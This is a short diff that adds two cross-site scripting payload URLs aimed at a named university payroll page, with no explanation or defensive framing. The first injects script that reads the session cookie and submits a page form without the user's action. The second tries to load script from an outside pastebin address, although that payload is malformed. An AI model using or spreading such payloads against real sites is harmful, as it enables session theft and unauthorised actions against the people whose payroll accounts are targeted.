@@ -1,0 +1,3 @@
+http://payroll.utexas.edu/account.php?eid=victim"><script>alert(document.cookie);document.forms[1].submit();</script><input id="victim" type="hidden
+
+http://payroll.utexas.edu/account.php?eid=victim"><script>src="http://pastebin.com/0wc3e55m"></script><input type="hidden
